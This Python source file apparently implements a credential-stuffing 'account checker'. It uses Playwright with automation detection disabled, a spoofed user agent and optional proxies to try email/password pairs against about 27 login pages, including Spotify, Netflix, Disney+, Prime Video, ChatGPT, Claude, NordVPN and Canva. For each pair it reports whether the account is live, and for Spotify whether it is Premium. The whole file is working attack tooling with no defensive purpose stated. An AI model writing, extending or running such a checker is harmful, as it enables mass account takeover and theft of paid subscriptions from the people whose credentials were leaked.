# checkers/browser_checkers.py
from playwright.async_api import async_playwright
import asyncio
from typing import Tuple, Optional
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class BrowserChecker:
    def __init__(self, headless: bool = True, timeout: int = 90, proxy: Optional[str] = None):
        self.headless = headless
        self.timeout = timeout
        self.proxy = proxy

    async def _init_browser(self):
        playwright = await async_playwright().start()
        browser = await playwright.chromium.launch(
            headless=self.headless,
            proxy={"server": self.proxy} if self.proxy else None,
            args=[
                '--disable-blink-features=AutomationControlled',
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        )
        context = await browser.new_context(
            viewport={'width': 1920, 'height': 1080},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        )
        page = await context.new_page()
        return playwright, browser, page

    # ============ SPOTIFY ============
    async def check_spotify(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://accounts.spotify.com/en/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.fill('input#login-username', email)
            await page.fill('input#login-password', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(8000)

            if "browse" in page.url or "home" in page.url:
                await page.goto("https://www.spotify.com/account/overview/")
                await page.wait_for_timeout(3000)
                content = await page.content()
                if "Premium" in content:
                    return True, "Spotify Premium"
                return True, "Spotify Free"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ NETFLIX ============
    async def check_netflix(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.netflix.com/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.fill('input[name="userLoginId"]', email)
            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(10000)

            if "browse" in page.url:
                return True, "Netflix account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ DISNEY+ ============
    async def check_disney(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.disneyplus.com/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.fill('input[name="email"]', email)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(2000)

            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(10000)

            if "home" in page.url or "browse" in page.url:
                return True, "Disney+ account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ HBO MAX ============
    async def check_hbomax(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.max.com/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.fill('input[type="email"]', email)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(2000)

            await page.fill('input[type="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(10000)

            if "browse" in page.url or "home" in page.url:
                return True, "HBO Max account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ PRIME VIDEO ============
    async def check_prime(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.amazon.com/ap/signin", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.fill('#ap_email', email)
            await page.click('#continue')
            await page.wait_for_timeout(2000)

            await page.fill('#ap_password', password)
            await page.click('#signInSubmit')
            await page.wait_for_timeout(10000)

            if "primevideo" in page.url or "prime" in page.url.lower():
                return True, "Prime Video account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ CRUNCHYROLL ============
    async def check_crunchyroll(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.crunchyroll.com/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(5000)

            await page.fill('input[name="email"]', email)
            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(12000)

            if "home" in page.url or "profile" in page.url:
                return True, "Crunchyroll account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ HULU ============
    async def check_hulu(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.hulu.com/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.fill('input[name="email"]', email)
            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(10000)

            if "home" in page.url or "browse" in page.url:
                return True, "Hulu account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ PARAMOUNT+ ============
    async def check_paramount(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.paramountplus.com/login/", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.fill('input[name="email"]', email)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(2000)

            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(10000)

            if "home" in page.url:
                return True, "Paramount+ account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ PEACOCK ============
    async def check_peacock(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.peacocktv.com/signin", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.fill('input[name="email"]', email)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(2000)

            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(10000)

            if "browse" in page.url:
                return True, "Peacock account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ PLEX ============
    async def check_plex(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://app.plex.tv/auth/#!", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.click('button:has-text("Sign In")')
            await page.wait_for_timeout(1000)

            await page.fill('input[name="email"]', email)
            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(10000)

            if "dashboard" in page.url:
                return True, "Plex account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ STARZ ============
    async def check_starz(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.starz.com/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.fill('input[name="email"]', email)
            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(10000)

            if "home" in page.url:
                return True, "Starz account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ MGM+ ============
    async def check_mgm(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.mgmplus.com/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.fill('input[name="email"]', email)
            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(10000)

            if "home" in page.url or "browse" in page.url:
                return True, "MGM+ account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ DISCOVERY+ ============
    async def check_discovery(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.discoveryplus.com/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.fill('input[name="email"]', email)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(2000)

            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(10000)

            if "home" in page.url:
                return True, "Discovery+ account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ ESPN+ ============
    async def check_espn(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.espn.com/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.fill('input[name="email"]', email)
            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(10000)

            if "espn.com" in page.url and "login" not in page.url:
                return True, "ESPN+ account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ TUBI ============
    async def check_tubi(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://tubitv.com/signin", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.fill('input[name="email"]', email)
            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(10000)

            if "home" in page.url:
                return True, "Tubi account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ PLUTO TV ============
    async def check_pluto(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://pluto.tv/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.fill('input[name="email"]', email)
            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(10000)

            if "home" in page.url or "pluto.tv" in page.url:
                return True, "Pluto TV account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ YOUTUBE MUSIC ============
    async def check_youtube_music(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://accounts.google.com/signin", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.fill('input[type="email"]', email)
            await page.click('#identifierNext')
            await page.wait_for_timeout(2000)

            await page.fill('input[type="password"]', password)
            await page.click('#passwordNext')
            await page.wait_for_timeout(10000)

            if "myaccount" in page.url or "google" in page.url:
                return True, "YouTube Music account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ AMAZON MUSIC ============
    async def check_amazon_music(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.amazon.com/music/player", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.fill('#ap_email', email)
            await page.click('#continue')
            await page.wait_for_timeout(2000)

            await page.fill('#ap_password', password)
            await page.click('#signInSubmit')
            await page.wait_for_timeout(10000)

            if "music" in page.url:
                return True, "Amazon Music account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ CHATGPT ============
    async def check_chatgpt(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://chat.openai.com/auth/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.click('button[data-testid="login-with-email"]')
            await page.wait_for_timeout(1000)

            await page.fill('input[name="username"]', email)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(2000)

            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(10000)

            if "chat" in page.url:
                return True, "ChatGPT account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ CLAUDE AI ============
    async def check_claude(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://claude.ai/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.fill('input[type="email"]', email)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(2000)

            await page.fill('input[type="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(10000)

            if "claude.ai" in page.url and "login" not in page.url:
                return True, "Claude AI account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ PERPLEXITY ============
    async def check_perplexity(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.perplexity.ai/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.fill('input[type="email"]', email)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(2000)

            await page.fill('input[type="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(10000)

            if "perplexity.ai" in page.url and "login" not in page.url:
                return True, "Perplexity AI account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ CURSOR ============
    async def check_cursor(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://cursor.sh/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.fill('input[type="email"]', email)
            await page.fill('input[type="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(10000)

            if "dashboard" in page.url or "cursor.sh" in page.url:
                return True, "Cursor account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ SURFSHARK ============
    async def check_surfshark(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://account.surfshark.com/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.fill('input[name="email"]', email)
            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(10000)

            if "dashboard" in page.url:
                return True, "Surfshark account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ NORDVPN ============
    async def check_nordvpn(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://my.nordaccount.com/login/", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.fill('input[name="email"]', email)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(2000)

            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(10000)

            if "dashboard" in page.url:
                return True, "NordVPN account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ EXPRESSVPN ============
    async def check_expressvpn(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.expressvpn.com/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.fill('input[name="email"]', email)
            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(10000)

            if "account" in page.url:
                return True, "ExpressVPN account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()

    # ============ CANVA ============
    async def check_canva(self, email: str, password: str) -> Tuple[bool, str]:
        playwright, browser, page = await self._init_browser()
        try:
            await page.goto("https://www.canva.com/login", timeout=self.timeout * 1000)
            await page.wait_for_timeout(3000)

            await page.fill('input[name="email"]', email)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(2000)

            await page.fill('input[name="password"]', password)
            await page.click('button[type="submit"]')
            await page.wait_for_timeout(10000)

            if "canva.com" in page.url and "login" not in page.url:
                return True, "Canva account active"
            return False, "Invalid credentials"
        except Exception as e:
            return False, f"Error: {str(e)[:50]}"
        finally:
            await browser.close()
            await playwright.stop()
